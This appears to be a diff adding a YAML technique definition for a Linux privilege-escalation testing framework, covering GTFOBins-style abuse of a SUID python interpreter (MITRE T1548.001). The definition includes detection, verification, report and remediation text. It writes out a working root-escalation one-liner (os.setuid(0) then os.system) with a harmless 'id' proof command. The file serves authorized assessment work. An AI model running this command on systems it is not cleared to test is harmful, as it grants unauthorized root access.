@@ -1,0 +1,36 @@
+# SUID python → root (GTFOBins)
+#
+# Also fires on python3, python3.8, python2.7, etc. — the adapter's
+# `suid` predicate is _canon-aware so `python` in `detect:` matches any
+# `python[0-9.]+` basename on the host, and the actual binary name lands
+# in `{{binary}}` so the command invokes the real file.
+technique: T1548.001
+name: SUID python → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: python
+execute:
+  # Python normally drops the SUID EUID; os.setuid(0) reasserts it,
+  # then os.system runs the proof command as root.
+  command: "{{binary}} -c 'import os;os.setuid(0);os.system(\"id\")'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    An SUID-root Python interpreter lets a user reassert the SUID EUID
+    via os.setuid(0), then run arbitrary code as root. Common on
+    misconfigured images that granted setuid to make a specific
+    Python-based tool "just work".
+  remediation: >
+    Remove the SUID bit from the python interpreter. Where a Python
+    script needs elevated capability, grant a narrow file capability
+    (e.g. cap_net_bind_service) via `setcap`, not full SUID.
+  refs: [T1548.001, GTFOBins/python]
